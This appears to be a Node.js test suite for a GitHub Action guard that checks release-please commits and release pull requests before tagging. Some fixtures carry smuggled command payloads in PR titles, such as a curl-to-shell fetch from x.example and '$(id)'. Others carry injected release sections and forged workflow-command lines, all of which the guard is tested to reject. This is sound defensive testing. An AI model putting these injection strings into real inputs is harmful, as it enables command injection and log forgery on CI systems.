// node --test, from this directory after `npm ci`: builds scratch repositories and runs
// guard.js the way action.yml does. Each case names the release-please behaviour it mirrors.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, mkdirSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const GUARD = join(here, 'guard.js');

const BAD_BODY = 'fix(core)!: order PublicKey by unsigned bytes\n\nCompare with\n' +
  'Arrays.compare(a.toByteArray(), b.toByteArray()).\n\nBREAKING CHANGE: ordering changed.\n';

function repo(config = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'guard-'));
  const git = (...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' }).trim();
  git('init', '-q', '-b', 'main');
  git('config', 'user.email', 't@example.com');
  git('config', 'user.name', 't');
  git('config', 'commit.gpgsign', 'false');
  let n = 0;
  const commitWithInput = (message, files) => {
    for (const [name, text] of Object.entries(files ?? { [`f${++n}.txt`]: 'x' })) {
      mkdirSync(join(dir, dirname(name)), { recursive: true });
      writeFileSync(join(dir, name), text);
      git('add', name);
    }
    execFileSync('git', ['commit', '-q', '--allow-empty', '-F', '-'], { cwd: dir, input: message });
    return git('rev-parse', 'HEAD');
  };
  const configure = (version, extra = {}) => {
    writeFileSync(join(dir, 'release-please-config.json'), JSON.stringify({
      'release-type': 'simple', 'include-v-in-tag': false, 'include-component-in-tag': false,
      ...config, packages: { '.': { 'package-name': 'p', ...(config.packages?.['.'] ?? {}), ...extra } },
    }));
    writeFileSync(join(dir, '.release-please-manifest.json'), JSON.stringify({ '.': version }));
  };
  const run = (env = {}) => {
    const r = spawnSync('node', [GUARD], {
      cwd: dir, encoding: 'utf8',
      env: { ...process.env, GH_TOKEN: '', GITHUB_REPOSITORY: '',
        CONFIG_FILE: join(dir, 'release-please-config.json'),
        MANIFEST_FILE: join(dir, '.release-please-manifest.json'), ...env },
    });
    return { code: r.status, out: r.stdout + r.stderr };
  };
  return { dir, git, commit: commitWithInput, configure, run };
}

test('an unparseable conventional commit since the manifest tag fails the run by name', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  const bad = r.commit(BAD_BODY);
  r.commit('feat: fine\n');
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, new RegExp(`::error::release-please cannot parse ${bad} `));
  assert.match(out, /unexpected token '\(' at 4:29, valid tokens \[\)\]/);
  assert.match(out, /checked 2 commit\(s\) since tag 1\.0\.0 \(manifest version 1\.0\.0\): 1 unparseable/);
});

test('commits before the tag are not read, and a clean range passes', () => {
  const r = repo();
  r.commit(BAD_BODY);
  r.git('tag', '1.0.0');
  r.commit('fix: later\n');
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 0, out);
  assert.match(out, /checked 1 commit\(s\) since tag 1\.0\.0/);
});

test('include-v-in-tag and the component spelling resolve the base', () => {
  const r = repo({ 'include-v-in-tag': true });
  r.commit('chore: start\n');
  r.git('tag', 'v2.3.4');
  r.commit(BAD_BODY);
  r.configure('2.3.4');
  assert.match(r.run().out, /since tag v2\.3\.4/);
  r.git('tag', 'p-v2.3.5');
  r.commit('feat: after\n');
  r.configure('2.3.5', { 'include-component-in-tag': true });
  const { code, out } = r.run();
  assert.equal(code, 0, out);
  assert.match(out, /since tag p-v2\.3\.5/);
});

test('without a tag the last commits are checked like a first release, with a notice', () => {
  const r = repo();
  r.commit('Initial import\n');
  r.commit(BAD_BODY);
  r.configure('0.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, /::notice::no release tag found for manifest version 0\.0\.0; checking the last 2 commit/);
});

test('a message that is not a conventional commit is a notice, as release-please ignores it', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  r.commit('Merge branch feature\n');
  r.commit('Revert "fix: x"\n\nThis reverts commit abc.\n');
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 0, out);
  assert.match(out, /release-please will not read [0-9a-f]{7} \(not a conventional commit\): Merge branch feature/);
  assert.match(out, /::notice::release-please will not read 2 of the 2 commit\(s\)/);
});

test('the parser, not a hand-written pattern, decides what counts as a conventional header', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  // a type with a digit: the pattern alone would call this a notice; the parser reads the header
  r.commit('fix2(core): header the pattern would reject\n\nBody(with(nested)) parens.\n');
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, /::error::/);
});

test('an empty scope is the one header the grammar rejects but release-please drops with its notes', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  r.commit('fix()!: empty scope\n\nBody(with(nested)) parens.\n\nBREAKING CHANGE: yes.\n');
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, /"fix\(\)!: empty scope"/);
});

test('a wrapped call shows the line end as <LF> in the parser position', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  r.commit('fix: wrapped\n\nCompare with\nfoo(a,\nb).\n');
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, /unexpected token '<LF>'/);
  assert.match(out, /While this run is red the release PR is not refreshed/);
});

test('a nested commit block is read from its own header, not the blank line before it', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  const outer = r.commit('feat: outer\n\nBEGIN_NESTED_COMMIT\nfix(core): inner\n\n' +
    'Arrays.compare(a.toByteArray(), b.toByteArray()).\nEND_NESTED_COMMIT\n');
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, new RegExp(`cannot parse ${outer} .*"fix\\(core\\): inner"`));
});

test('on a release-merge run the nearest earlier tag is the base, read locally', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  r.commit('feat: in the release\n');
  r.commit('chore(main): release 1.1.0\n');
  r.configure('1.1.0');
  const { code, out } = r.run();
  assert.equal(code, 0, out);
  assert.match(out, /checked 2 commit\(s\) since nearest tag 1\.0\.0 \(manifest version 1\.1\.0 has no tag yet\)/);
});

test('a squash message is split like release-please splits it, and each part is parsed', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  const squash = r.commit('feat: first part\n\nfix(core): second part\n\n' +
    'Arrays.compare(a.toByteArray(), b.toByteArray()).\n');
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, new RegExp(`cannot parse ${squash} .*"fix\\(core\\): second part"`));
});

test('a later commit with a Restates footer acknowledges the dropped one; every footer counts', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  const bad1 = r.commit(BAD_BODY);
  const bad2 = r.commit(BAD_BODY.replace('order PublicKey', 'order Hash'));
  r.commit(`fix(core)!: order PublicKey and Hash by unsigned bytes\n\nRestated.\n\n` +
    `BREAKING CHANGE: ordering changed.\n\nRestates: ${bad1.slice(0, 7)}\nRestates: ${bad2.slice(0, 7)}\n`);
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 0, out);
  assert.match(out, /\(restated by a later commit\): fix\(core\)!: order PublicKey/);
  assert.match(out, /\(restated by a later commit\): fix\(core\)!: order Hash/);
});

test('a Restates footer on a commit release-please cannot read acknowledges nothing', () => {
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  const bad = r.commit(BAD_BODY);
  // the carrier fails to parse for the same reason, so its restatement never reaches the notes
  r.commit(`fix(core)!: restated\n\nStill(with(nested)) parens.\n\nRestates: ${bad.slice(0, 7)}\n`);
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, new RegExp(`cannot parse ${bad} `));
  assert.match(out, /2 unparseable conventional commit\(s\)/);
});

test('with exclude-paths, a commit whose files all sit under them is skipped like release-please skips it', () => {
  const r = repo({ packages: { '.': { 'exclude-paths': ['ix-mapper-ts'] } } });
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  r.commit(BAD_BODY, { 'ix-mapper-ts/a.ts': 'x' });               // excluded
  const empty = r.commit(`fix: restate nothing\n\nRestates: 0000000\n`, {}); // lists no file: excluded too
  r.configure('1.0.0');
  const first = r.run();
  assert.equal(first.code, 0, first.out);
  assert.match(first.out, /2 excluded by exclude-paths/);
  assert.match(first.out, new RegExp(`release-please excludes ${empty.slice(0, 7)} `));
  const kept = r.commit(BAD_BODY, { 'ix-mapper-ts/b.ts': 'x', 'src/C.java': 'y' }); // one file outside
  const second = r.run();
  assert.equal(second.code, 1, second.out);
  assert.match(second.out, new RegExp(`cannot parse ${kept} `));
  assert.match(second.out, /release-please excludes an empty commit/);
});

test('an empty exclude-paths list still excludes an empty commit, as release-please does', () => {
  const r = repo({ packages: { '.': { 'exclude-paths': [] } } });
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  const bad = r.commit(BAD_BODY);
  r.commit(`fix: restate\n\nRestates: ${bad.slice(0, 7)}\n`, {}); // empty: excluded, so it acknowledges nothing
  r.configure('1.0.0');
  const { code, out } = r.run();
  assert.equal(code, 1, out);
  assert.match(out, /1 excluded by exclude-paths/);
  assert.match(out, new RegExp(`cannot parse ${bad} `));
});

// A stand-in for gh against the GitHub API: serves the requested page of the given pull
// requests in that state, and file contents by ref and path; logs every call, and fails
// every call when asked to.
const GH_STUB = `#!/usr/bin/env node
const fs = require('node:fs');
const args = process.argv.slice(2);
fs.appendFileSync(process.env.GH_STUB_LOG, JSON.stringify(args) + '\\n');
const query = args[args.length - 1] || '';
const fixture = JSON.parse(fs.readFileSync(process.env.GH_STUB_FIXTURE, 'utf8'));
const fail = (status) => { process.stderr.write('HTTP ' + status); process.exit(1); };
if (process.env.GH_STUB_FAIL) fail('502: Bad Gateway');
const file = /^repos\\/o\\/r\\/contents\\/(.+)\\?ref=(.+)$/.exec(query);
if (file && (fixture.unavailable || []).includes(decodeURIComponent(file[1]))) fail('502: Bad Gateway');
if (file) {
  const key = decodeURIComponent(file[2]) + '|' + file[1].split('/').map(decodeURIComponent).join('/');
  if (!(key in fixture.files)) fail('404: Not Found ' + key);
  process.stdout.write(fixture.files[key]);
  process.exit(0);
}
if (!/^repos\\/o\\/r\\/pulls\\?/.test(query)) fail('404: Not Found');
const state = /[?&]state=(\\w+)/.exec(query)[1];
const page = Number(/[?&]page=(\\d+)/.exec(query)[1]);
const per = Number(/[?&]per_page=(\\d+)/.exec(query)[1]);
process.stdout.write(JSON.stringify(fixture.pulls.filter((p) => p.state === state).slice((page - 1) * per, page * per)));
`;

// The guard reads the config and manifest the way release-please does, from the target
// branch through the API, so the stub serves the scratch repository's own files there.
function ghStub(r, pulls, { files = {}, branch = 'main', fail = false, env = {}, unavailable = [] } = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'gh-'));
  const log = join(dir, 'calls.log');
  const read = (name) => readFileSync(join(r.dir, name), 'utf8');
  writeFileSync(join(dir, 'gh'), GH_STUB, { mode: 0o755 });
  // The manifest at a release's own commit (MERGE for merged, HEAD_SHA for open pull
  // requests) is the scratch repository's unless a test says otherwise.
  writeFileSync(join(dir, 'fixture.json'), JSON.stringify({ pulls, files: {
    [`${branch}|release-please-config.json`]: read('release-please-config.json'),
    [`${branch}|.release-please-manifest.json`]: read('.release-please-manifest.json'),
    [`${MERGE}|.release-please-manifest.json`]: read('.release-please-manifest.json'),
    [`${HEAD_SHA}|.release-please-manifest.json`]: read('.release-please-manifest.json'),
    ...files,
  }, unavailable }));
  writeFileSync(log, '');
  return {
    env: { PATH: `${dir}:${process.env.PATH}`, GH_TOKEN: 'stub', GITHUB_REPOSITORY: 'o/r', TARGET_BRANCH: branch,
      GH_STUB_FIXTURE: join(dir, 'fixture.json'), GH_STUB_LOG: log, ...(fail ? { GH_STUB_FAIL: '1' } : {}), ...env },
    calls: () => readFileSync(log, 'utf8').split('\n').filter(Boolean).map((line) => JSON.parse(line)),
  };
}

// Release pull requests shaped like release-please's own: its head branch, and a body with
// the header, the '---' delimiters and one release's notes.
const HEAD = 'release-please--branches--main--components--p';
const MERGE = 'c'.repeat(40);
const HEAD_SHA = 'd'.repeat(40);
const manifestOf = (version) => JSON.stringify({ '.': version });
const releaseBody = (version, notes = '* later') => ':robot: I have created a release *beep* *boop*\n---\n\n\n' +
  `## [${version}](https://github.com/o/r/compare/1.0.0...${version}) (2026-10-13)\n\n\n### Bug Fixes\n\n${notes}\n\n` +
  '---\nThis PR was generated with [Release Please](https://github.com/googleapis/release-please).';
const pull = (number, version, {
  title = `chore(main): release ${version}`, body = releaseBody(version), merged = true, open = false,
  labels = ['autorelease: pending'], head = HEAD, base = 'main',
} = {}) => ({
  number, title, body, head: { ref: head, sha: HEAD_SHA }, base: { ref: base },
  state: open ? 'open' : 'closed', merged_at: merged && !open ? '2026-10-13T00:00:00Z' : null,
  merge_commit_sha: merged && !open ? MERGE : null, labels: labels.map((name) => ({ name })),
});
const filler = (from, count, opts) => Array.from({ length: count }, (_, i) =>
  pull(from + i, '0.0.1', { title: 'fix: x', body: 'x', labels: [], ...opts }));
const evilSections = (version) => `* handle \`<details><summary>${version}</summary></details>` +
  `<details><summary>x: 1.0.0</summary></details>\``;

// After a release pull request merged: the manifest holds the version it wrote.
function released(config = {}, version = '25.12.1') {
  const r = repo(config);
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  r.commit('fix: later\n');
  r.configure(version);
  return r;
}

test("a merged release pull request release-please would tag with the manifest's plain version passes", () => {
  const r = released();
  const gh = ghStub(r, [pull(7, '25.12.1')]);
  const { code, out } = r.run(gh.env);
  assert.equal(code, 0, out);
  assert.match(out, /checked the releases release-please would cut: 1 from merged and 0 from open release pull request\(s\)/);
  const queries = gh.calls().map((args) => args[args.length - 1]);
  assert.ok(queries.some((q) => /^repos\/o\/r\/pulls\?state=closed&base=main&/.test(q)), queries.join('\n'));
});

test('without TARGET_BRANCH, the branch the run is on is the target', () => {
  const r = released();
  const gh = ghStub(r, [pull(8, '25.12.1', { title: 'chore(trunk): release 25.12.1',
    head: 'release-please--branches--trunk--components--p', base: 'trunk' })],
  { branch: 'trunk', env: { TARGET_BRANCH: '', GITHUB_REF_NAME: 'trunk' } });
  const { code, out } = r.run(gh.env);
  assert.equal(code, 0, out);
  assert.match(out, /1 from merged/);
  // TARGET_BRANCH, the repository's default branch, wins over the branch the run is on.
  const both = ghStub(r, [pull(8, '25.12.1')], { env: { TARGET_BRANCH: 'main', GITHUB_REF_NAME: 'trunk' } });
  const winner = r.run(both.env);
  assert.equal(winner.code, 0, winner.out);
  assert.ok(both.calls().every((args) => !/base=trunk/.test(args[args.length - 1])), JSON.stringify(both.calls()));
});

test('a title whose version is not X.Y.Z fails the run before release-please can tag it', () => {
  const r = released();
  const gh = ghStub(r, [pull(9, '25.12.1', { title: 'chore(main): release 25.12.1-$(curl${IFS}-sL${IFS}x.example|sh)' })]);
  const { code, out } = r.run(gh.env);
  assert.equal(code, 1, out);
  assert.match(out, /::error::merged release pull request #9 is about to be tagged, but release-please would tag it "25\.12\.1-\$\(curl\$\{IFS\}-sL\$\{IFS\}x\.example\|sh\)", which is not a plain X\.Y\.Z version, and not "25\.12\.1"/);
  assert.match(out, /Nothing has been tagged/);
});

test('a body whose release sections substitute another version fails, a plain one included', () => {
  // Contributor commit text reaches the notes; with two sections release-please tags the body's.
  for (const version of ['999.0.0', '9.9.9-$(id)']) {
    const r = released();
    const { code, out } = r.run(ghStub(r, [pull(10, '25.12.1',
      { body: releaseBody('25.12.1', evilSections(version)) })]).env);
    assert.equal(code, 1, out);
    assert.match(out, new RegExp(`release-please would tag it "${version.replace(/[$()]/g, '\\$&')}"`));
  }
});

test('escaped markup that release-please decodes into a second release section fails', () => {
  // release-please parses the body, writes it back with the escapes decoded, and parses it again.
  const notes = '<details><summary>9.9.9-evil</summary>&lt;details&gt;&lt;summary&gt;x: 1.0.0&lt;/summary&gt;' +
    'notes&lt;/details&gt;</details>';
  const r = released();
  const { code, out } = r.run(ghStub(r, [pull(11, '25.12.1', { body: releaseBody('25.12.1', notes) })]).env);
  assert.equal(code, 1, out);
  assert.match(out, /release-please would tag it "9\.9\.9-evil"/);
});

test('a body re-read from a branch file through the overflow message is checked like any other', () => {
  // release-please writes an overflowing body only to <head branch>--release-notes.
  const overflow = (ref) => ':robot: I have created a release *beep* *boop*\n---\n\n\nThis release is too large to ' +
    `preview in the pull request body. View the full release notes here: https://github.com/o/r/blob/${ref}/release-notes.md` +
    '\n\n---\nThis PR was generated with [Release Please](https://github.com/googleapis/release-please).';
  const notes = `${HEAD}--release-notes`;
  const legit = released();
  const ok = legit.run(ghStub(legit, [pull(12, '25.12.1', { body: overflow(notes) })],
    { files: { [`${notes}|release-notes.md`]: releaseBody('25.12.1') } }).env);
  assert.equal(ok.code, 0, ok.out);
  assert.match(ok.out, /1 from merged/);
  const evil = released();
  const bad = evil.run(ghStub(evil, [pull(13, '25.12.1', { body: overflow(notes) })],
    { files: { [`${notes}|release-notes.md`]: releaseBody('25.12.1', evilSections('9.9.9-$(id)')) } }).env);
  assert.equal(bad.code, 1, bad.out);
  assert.match(bad.out, /#13 is about to be tagged, but release-please would tag it "9\.9\.9-\$\(id\)"/);
});

test('an overflow link to any ref but <head branch>--release-notes fails, whatever the file holds now', () => {
  // A fork pull request's head, or the target branch, holds files someone else controls, which
  // can change between this check and the release.
  for (const ref of ['pull/123/head', 'main']) {
    const r = released();
    const body = ':robot: I have created a release *beep* *boop*\n---\n\n\n* This release is too large to preview in ' +
      `the pull request body. View the full release notes here: https://github.com/o/r/blob/${ref}/release-notes.md` +
      '\n\n---\nfooter';
    const { code, out } = r.run(ghStub(r, [pull(27, '25.12.1', { body })],
      { files: { [`${ref}|release-notes.md`]: releaseBody('25.12.1') } }).env);
    assert.equal(code, 1, out);
    assert.match(out, new RegExp(`#27 makes release-please read release-notes\\.md from "${ref.replace(/\//g, '\\/')}"`));
  }
});

test("the manifest at the release's own commit decides, not a checkout that predates the merge", () => {
  // A re-run of an older release run checks out a commit before the release pull request merged.
  const stale = released({}, '25.12.0');
  const fine = stale.run(ghStub(stale, [pull(28, '25.12.1')],
    { files: { [`${MERGE}|.release-please-manifest.json`]: manifestOf('25.12.1') } }).env);
  assert.equal(fine.code, 0, fine.out);
  const edited = released({}, '25.12.0');
  const older = edited.run(ghStub(edited, [pull(29, '25.12.0')],
    { files: { [`${MERGE}|.release-please-manifest.json`]: manifestOf('25.12.1') } }).env);
  assert.equal(older.code, 1, older.out);
  assert.match(older.out, /#29 is about to be tagged, but release-please would tag it "25\.12\.0", which is not "25\.12\.1"/);
});

test('release-please failing on a pull request names it, rather than asking for a re-run', () => {
  // A <details> without a <summary> makes release-please's body parser throw, on every run.
  const body = releaseBody('25.12.1', '* see <details>x</details>');
  const merged = released();
  const failed = merged.run(ghStub(merged, [pull(30, '25.12.1', { body })]).env);
  assert.equal(failed.code, 1, failed.out);
  assert.match(failed.out, /::error::could not work out the releases release-please would cut: release-please fails on release pull request #30/);
  assert.doesNotMatch(failed.out, /re-run the job/);
  const open = released({}, '25.12.0');
  const warned = open.run(ghStub(open, [pull(31, '25.12.1', { body, open: true })]).env);
  assert.equal(warned.code, 0, warned.out);
  assert.match(warned.out, /::warning::open release pull requests not checked: release-please fails on release pull request #31/);
});

test('tags are spelled as release-please spells them, settings inherited from the top level included', () => {
  const v = released({ 'include-v-in-tag': true });
  const withV = v.run(ghStub(v, [pull(14, '25.12.1')]).env);
  assert.equal(withV.code, 1, withV.out);
  assert.match(withV.out, /would tag it "v25\.12\.1", which is not a plain X\.Y\.Z version/);
  const c = released({ 'include-component-in-tag': true });
  const withComponent = c.run(ghStub(c, [pull(15, '25.12.1')]).env);
  assert.equal(withComponent.code, 1, withComponent.out);
  assert.match(withComponent.out, /would tag it "p-25\.12\.1"/);
});

test("release-please's own defaults put the component and a v into the tag, which the guard refuses", () => {
  const r = released({ 'include-v-in-tag': undefined, 'include-component-in-tag': undefined });
  const { code, out } = r.run(ghStub(r, [pull(26, '25.12.1')]).env);
  assert.equal(code, 1, out);
  assert.match(out, /would tag it "p-v25\.12\.1", which is not a plain X\.Y\.Z version/);
});

test('release-please picks the pull requests by its configured labels, every one required', () => {
  const r = released({ label: 'release-ready,approved' });
  const { code, out } = r.run(ghStub(r, [
    pull(16, '25.12.1', { title: 'chore(main): release 25.12.1-$(id)', labels: ['release-ready', 'approved'] }),
    pull(17, '25.12.1', { title: 'chore(main): release 25.12.1-$(id)', labels: ['release-ready'] }),
    pull(18, '25.12.1', { title: 'chore(main): release 25.12.1-$(id)' }),
  ]).env);
  assert.equal(code, 1, out);
  assert.match(out, /merged release pull request #16 is about to be tagged/);
  assert.doesNotMatch(out, /#17|#18/);
  assert.match(out, /1 from merged/);
});

test('the listing goes as deep as release-please reads, 200 merged pull requests, and no deeper', () => {
  const r = released();
  const found = r.run(ghStub(r, [...filler(1000, 1100, { merged: false }), ...filler(3000, 149),
    pull(19, '25.12.1', { title: 'chore(main): release 25.12.1-$(id)' })]).env);
  assert.equal(found.code, 1, found.out);
  assert.match(found.out, /merged release pull request #19 is about to be tagged/);
  // 50 unmerged first, so the 201st merged pull request shares a page with the 200th.
  const past = r.run(ghStub(r, [...filler(1000, 50, { merged: false }), ...filler(3000, 200),
    pull(20, '25.12.1', { title: 'chore(main): release 25.12.1-$(id)' })]).env);
  assert.equal(past.code, 0, past.out);
  assert.match(past.out, /0 from merged/);
});

test('an open release pull request that would be refused once merged is a warning; an unlabelled one is ignored', () => {
  // On main the manifest still holds the last release; the open pull request's head holds the next.
  const r = released({}, '25.12.0');
  const head = { files: { [`${HEAD_SHA}|.release-please-manifest.json`]: manifestOf('25.12.1') } };
  const legit = r.run(ghStub(r, [pull(32, '25.12.1', { open: true })], head).env);
  assert.equal(legit.code, 0, legit.out);
  assert.doesNotMatch(legit.out, /::warning::/);
  assert.match(legit.out, /1 from open/);
  const { code, out } = r.run(ghStub(r, [
    pull(21, '25.12.1', { title: 'chore(main): release 25.12.1-$(id)', open: true }),
    pull(22, '25.12.1', { title: 'chore(main): release 25.12.1-$(id)', open: true, labels: [], head: 'feature' }),
  ], head).env);
  assert.equal(code, 0, out);
  assert.match(out, /::warning::open release pull request #21: once merged, release-please would tag it "25\.12\.1-\$\(id\)"/);
  assert.doesNotMatch(out, /#22/);
});

test('a GitHub API failure fails the run rather than skipping the check', () => {
  const r = released();
  const { code, out } = r.run(ghStub(r, [], { fail: true }).env);
  assert.equal(code, 1, out);
  assert.match(out, /::error::could not read the release pull requests from GitHub \(.*\); re-run the job/);
});

test('a pull request release-please would not tag is left alone', () => {
  // A title release-please cannot read: release-please logs it and tags nothing.
  const r = released();
  const { code, out } = r.run(ghStub(r, [pull(23, '25.12.1', { title: 'Release everything' })]).env);
  assert.equal(code, 0, out);
  assert.match(out, /0 from merged/);
});

test('a pull-request-title-pattern, the package setting first, is read by release-please', () => {
  for (const config of [
    { 'pull-request-title-pattern': 'release${component}: ${version}' },
    { packages: { '.': { 'pull-request-title-pattern': 'release${component}: ${version}' } },
      'pull-request-title-pattern': 'chore${scope}: release${component} ${version}' },
  ]) {
    const ok = released(config);
    const good = ok.run(ghStub(ok, [pull(24, '25.12.1', { title: 'release: 25.12.1' })]).env);
    assert.equal(good.code, 0, good.out);
    assert.match(good.out, /1 from merged/);
    const bad = released(config);
    const evil = bad.run(ghStub(bad, [pull(25, '25.12.1', { title: 'release: 25.12.1-$(id)' })]).env);
    assert.equal(evil.code, 1, evil.out);
    assert.match(evil.out, /#25 is about to be tagged, but release-please would tag it "25\.12\.1-\$\(id\)"/);
  }
});

test('the config and manifest paths are used as given when relative, as the action passes them', () => {
  const r = released();
  const { code, out } = r.run({ ...ghStub(r, [pull(33, '25.12.1')]).env,
    CONFIG_FILE: 'release-please-config.json', MANIFEST_FILE: '.release-please-manifest.json' });
  assert.equal(code, 0, out);
  assert.match(out, /1 from merged/);
});

test('a file a pull request names that does not exist names the pull request, without asking for a re-run', () => {
  const overflow = (ref) => ':robot: I have created a release *beep* *boop*\n---\n\n\nThis release is too large to ' +
    `preview in the pull request body. View the full release notes here: https://github.com/o/r/blob/${ref}/release-notes.md` +
    '\n\n---\nfooter';
  const missing = released();
  const notes = missing.run(ghStub(missing, [pull(34, '25.12.1', { body: overflow(`${HEAD}--release-notes`) })]).env);
  assert.equal(notes.code, 1, notes.out);
  assert.match(notes.out, /::error::could not work out the releases release-please would cut: release-please fails on release pull request #34 \(release-notes\.md does not exist on/);
  assert.doesNotMatch(notes.out, /re-run the job/);
  const foreign = released();
  const link = foreign.run(ghStub(foreign, [pull(35, '25.12.1', { body: overflow('pull/9/head') })]).env);
  assert.equal(link.code, 1, link.out);
  assert.match(link.out, /#35 makes release-please read release-notes\.md from "pull\/9\/head"/);
  assert.doesNotMatch(link.out, /re-run the job/);
  const noManifest = released();
  const merge = noManifest.run(ghStub(noManifest, [pull(36, '25.12.1')],
    { files: { [`${MERGE}|.release-please-manifest.json`]: undefined } }).env);
  assert.equal(merge.code, 1, merge.out);
  assert.match(merge.out, /release pull request #36's merge commit has no readable \.release-please-manifest\.json/);
  assert.doesNotMatch(merge.out, /re-run the job/);
});

test('the API failing while release-please reads a pull request still asks for a re-run', () => {
  const r = released();
  const body = ':robot: I have created a release *beep* *boop*\n---\n\n\nThis release is too large to preview in ' +
    `the pull request body. View the full release notes here: https://github.com/o/r/blob/${HEAD}--release-notes/release-notes.md` +
    '\n\n---\nfooter';
  const { code, out } = r.run(ghStub(r, [pull(37, '25.12.1', { body })], { unavailable: ['release-notes.md'] }).env);
  assert.equal(code, 1, out);
  assert.match(out, /::error::could not read the release pull requests from GitHub \(.*\); re-run the job/);
});

test('an open release pull request linking a foreign ref, or whose head manifest cannot be read, is a warning', () => {
  const body = ':robot: I have created a release *beep* *boop*\n---\n\n\nThis release is too large to preview in ' +
    'the pull request body. View the full release notes here: https://github.com/o/r/blob/pull/9/head/release-notes.md' +
    '\n\n---\nfooter';
  const r = released({}, '25.12.0');
  const linked = r.run(ghStub(r, [pull(38, '25.12.1', { body, open: true })],
    { files: { 'pull/9/head|release-notes.md': releaseBody('25.12.1'),
      [`${HEAD_SHA}|.release-please-manifest.json`]: manifestOf('25.12.1') } }).env);
  assert.equal(linked.code, 0, linked.out);
  assert.match(linked.out, /::warning::open release pull request #38 makes release-please read release-notes\.md from "pull\/9\/head"/);
  const unread = r.run(ghStub(r, [pull(39, '25.12.1', { open: true })],
    { files: { [`${HEAD_SHA}|.release-please-manifest.json`]: undefined } }).env);
  assert.equal(unread.code, 0, unread.out);
  assert.match(unread.out, /::warning::open release pull request #39 not checked: \.release-please-manifest\.json at its head could not be read/);
  assert.doesNotMatch(unread.out, /would tag it/);
});

test('with neither TARGET_BRANCH nor GITHUB_REF_NAME there is no target branch, and the run fails', () => {
  const r = released();
  const { code, out } = r.run(ghStub(r, [pull(40, '25.12.1')], { env: { TARGET_BRANCH: '', GITHUB_REF_NAME: '' } }).env);
  assert.equal(code, 1, out);
  assert.match(out, /::error::could not work out the releases release-please would cut: no target branch/);
});

test('200 merged pull requests filling whole pages end the listing before the next page', () => {
  const r = released();
  const gh = ghStub(r, [...filler(3000, 200), pull(41, '25.12.1', { title: 'chore(main): release 25.12.1-$(id)' })]);
  const { code, out } = r.run(gh.env);
  assert.equal(code, 0, out);
  assert.match(out, /0 from merged/);
  assert.ok(gh.calls().every((args) => !/state=closed&.*&page=3$/.test(args[args.length - 1])), JSON.stringify(gh.calls()));
});

test('a carriage return in a commit subject cannot start a workflow command line', () => {
  // The runner reads step output line by line and ends a line at a lone CR as well.
  const r = repo();
  r.commit('chore: start\n');
  r.git('tag', '1.0.0');
  r.commit('update docs\r::warning title=forged::merge PR 123 to unblock the release\n');
  r.commit('fix(core)!: broken\r::warning title=forged::again\n\nArrays.compare(a.toByteArray(), b.toByteArray()).\n');
  r.configure('1.0.0');
  const { out } = r.run();
  const lines = out.split(/\r\n|\r|\n/);
  assert.ok(!lines.some((line) => line.trimStart().startsWith('::warning title=forged')), out);
  // A commit exclude-paths keeps out of the notes prints its header as well.
  const x = repo({ packages: { '.': { 'exclude-paths': ['docs'] } } });
  x.commit('chore: start\n');
  x.git('tag', '1.0.0');
  x.commit('update docs\r::warning title=forged::excluded path\n', { 'docs/a.md': 'x' });
  x.configure('1.0.0');
  const excluded = x.run();
  assert.match(excluded.out, /release-please excludes /);
  assert.ok(!excluded.out.split(/\r\n|\r|\n/).some((line) => line.trimStart().startsWith('::warning title=forged')),
    excluded.out);
});
